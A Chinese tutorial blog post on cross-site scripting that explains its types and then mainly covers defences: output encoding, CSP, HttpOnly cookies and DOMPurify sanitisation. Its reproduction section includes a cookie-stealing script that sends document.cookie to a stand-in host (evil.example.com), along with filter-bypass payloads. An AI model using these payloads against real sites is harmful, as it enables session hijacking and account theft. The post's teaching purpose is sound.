---
title: 一次 XSS 的完整复现与防御
tags:
  - 网络安全
  - XSS
categories:
  - 网络安全
cover: /img/default_cover.svg
description: 从「弹个 alert」到「偷走 Cookie」，一步步看 XSS 能干什么，以及前端到底该怎么防。
date: 2026-09-07 21:20:00
---

XSS（跨站脚本）是出现频率最高的一类前端漏洞。很多人对它的印象停留在「弹个窗」，但它真正危险的地方在于：**脚本能做任何用户能做的事**。

## 三种类型

| 类型 | 触发方式 | 典型场景 |
| --- | --- | --- |
| 反射型 | 恶意代码在 URL 里，服务端原样返回 | 搜索结果页、错误提示页 |
| 存储型 | 恶意代码被存进数据库 | 评论区、昵称、个性签名 |
| DOM 型 | 前端 JS 把不可信数据写进 DOM | `innerHTML = location.hash` |

## 复现：从 alert 到盗号

**第一步：确认有没有洞**

在搜索框输入：

```html
<script>alert(1)</script>
```

如果页面弹窗了，说明后端把输入原样输出了。

**第二步：换成真正有害的载荷**

```html
<script>
  fetch('https://evil.example.com/steal?c=' + document.cookie)
</script>
```

只要受害者访问了这个页面，**Cookie 就到攻击者手上了**。如果 Cookie 里带着会话 ID，且没有 `HttpOnly`，账号就丢了。

**第三步：绕过常见过滤**

很多站点会过滤 `<script>`，但可以绕：

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href="javascript:alert(1)">点我</a>
```

所以**黑名单过滤基本没用**，必须做输出编码。

## 防御：四道防线

### 1. 输出编码（最重要）

根据输出位置选对应的编码方式：

| 输出位置 | 该做的编码 |
| --- | --- |
| HTML 文本节点 | HTML 实体编码（`<` → `&lt;`） |
| HTML 属性 | 属性编码，并且**属性值必须加引号** |
| JS 字符串里 | JS 转义（`\` `'` `"`） |
| URL 参数 | `encodeURIComponent` |

现代框架已经默认帮你做了：

- React：`{}` 插值默认转义，只有 `dangerouslySetInnerHTML` 会跳过
- Vue：`{{ }}` 默认转义，只有 `v-html` 会跳过

**原则：永远不要用 `v-html` / `dangerouslySetInnerHTML` 渲染用户输入。**

### 2. CSP（内容安全策略）

加一个响应头，从根上限制脚本来源：

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'";
```

配了 CSP 之后，即使有漏网的 XSS，内联脚本也执行不了。这是**性价比最高的一道防线**。

### 3. Cookie 加 HttpOnly

```http
Set-Cookie: sessionid=xxx; HttpOnly; Secure; SameSite=Lax
```

`HttpOnly` 之后 JS 读不到 Cookie，就算 XSS 成功也偷不走会话。

### 4. 富文本要专门处理

如果业务确实需要用户发 HTML（比如博客评论支持加粗），必须走**白名单消毒**，用 DOMPurify 这类成熟库，不要自己写正则。

```bash
npm install dompurify
```

```js
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

## 自查清单

- [ ] 所有用户输入输出时都做了编码
- [ ] 没有任何地方用 `innerHTML` / `v-html` 渲染用户输入
- [ ] 配了 CSP
- [ ] 会话 Cookie 带 `HttpOnly`
- [ ] 富文本走白名单消毒

---

**记住一句话**：转义是防守，CSP 是保险，HttpOnly 是底裤。三层都穿上才敢睡觉。
